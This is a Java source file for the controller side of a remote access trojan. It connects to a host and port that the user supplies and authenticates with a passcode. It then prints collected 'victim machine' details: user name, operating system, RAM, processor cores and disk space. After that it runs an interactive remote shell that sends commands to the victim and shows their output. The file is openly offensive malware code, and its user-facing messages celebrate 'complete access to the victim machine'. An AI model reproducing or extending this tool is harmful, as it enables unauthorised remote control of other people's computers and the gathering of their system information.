import java.util.Scanner;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;


class Client {
	public static void main ( String[] args ) throws Exception {
		Scanner scanner = new Scanner(System.in);
		int port;
		String host;

		System.out.print( "Enter the host ip : " );
		host = scanner.nextLine();
		System.out.print( "Enter the port no : " );
		port = scanner.nextInt();
		
		RAT rat = new RAT(port, host, "**");
		rat.initiateConnection();
	}
}


class RAT {
	int port;
	String host, endSignal;
	
	RAT( int port, String host, String endSignal ) {
		this.port = port;
		this.host = host;
		this.endSignal = endSignal;
	}

	public void displayVictimInfo( Socket socket, BufferedReader br ) {
		try {
			String info = br.readLine();
        	        String os = br.readLine();
                	String ram_capacity = br.readLine();
	                String cores = br.readLine();
        	        String absolutePath = br.readLine();
                	String totalSpace = br.readLine();
	                String freeSpace = br.readLine();
        	        String usableSpace = br.readLine();

	                System.out.println ( "\t\tVICTIM MACHINE INFO\n" );
        	        System.out.println ( "User name \t\t :  " + info );
                	System.out.println ( "Operating System \t :  " + os );
	                System.out.println ( "Ram capacity : \t\t :  " + ram_capacity );
        	        System.out.println ( "Processor cores \t :  " + cores );
                	System.out.println ( "Absolute Path \t\t :  " + absolutePath );
	                System.out.println ( "Toatl Space \t\t :  " + totalSpace );
        	        System.out.println ( "Free Space \t\t :  " + freeSpace );
                	System.out.println ( "Usable Space \t\t :  " + usableSpace );
	                System.out.println ( "\n" );

        	        for ( int i=0; i<75; i++ )
                	        System.out.print ( '-' );
	                System.out.println ( "\n\n" );
		}
		catch( Exception ex ) {
			ex.printStackTrace();
		}
	}	
	

	public void authUser(Socket socket, PrintWriter printWriter, BufferedReader br) {
		Scanner scanner = new Scanner(System.in);	
		String username, passcode;
		
		System.out.print ( "Enter the User name : " );
                username = scanner.nextLine();
                System.out.print ( "Enter the password : ");
                passcode = scanner.nextLine();

               	printWriter.println ( passcode );
                printWriter.flush();
		
		try {
                	String result = br.readLine();
	
        	        if ( result.equals("Access Granted") ) {
				Process p = Runtime.getRuntime().exec("clear");
                        	for ( int i=0; i<75; i++ )
					System.out.print ( '-' );
        	                System.out.println ( "\n\n\t\t\tWelcome Mr." + username );
                	        System.out.println ( "\tYou Have gained complete access to the victim machine.\n" );

                        	for ( int i=0; i<75; i++ )
					System.out.print ( '-' );
        	                System.out.println ('\n');

				displayVictimInfo(socket, br);
				return;
			}
			else {
                	        for ( int i=0; i<50; i++ )
                        	        System.out.print ( '-' );
	                        System.out.println ( "\n\n\t\tACCESS DENIED!\n" );
	
        	                for ( int i=0; i<50; i++ )
                	                System.out.print ( '-' );
	                        System.out.println ('\n');
        	                System.exit(0);
	                }
		}
		catch( Exception ex ) {
			ex.printStackTrace();
		}

	}
	
	public void initiateConnection() {
		Scanner scanner = new Scanner ( System.in );
		try {
			Socket socket = new Socket( host, port );
	                PrintWriter printWriter = new PrintWriter ( socket.getOutputStream() );
        	        BufferedReader br = new BufferedReader ( new InputStreamReader(socket.getInputStream()) );
			
			authUser(socket, printWriter, br);
			
			while ( !socket.isClosed() ) {
                        	try {
                                	System.err.print ( "[remote shell] $ " );
	                                String cmd = scanner.nextLine();
	
        	                        printWriter.println ( cmd );
                	                printWriter.flush();
	
        	                        if ( cmd.equals("exit") )
                	                        break;
	
        	                        String line;
                	                while ( (line = br.readLine()) != null ) {
                        	                if ( line.endsWith(endSignal) )
                                	                break;
                                        	System.out.println ( line );
	                                }
        	                }
                	        catch ( Exception ex ) {
                        	        ex.printStackTrace();
                                	br.close();
	                                printWriter.close();
        	                        socket.close();
                	        }
	                }
		}
		catch( Exception ex ) {
			ex.printStackTrace();
		}

	}	
		
		
}

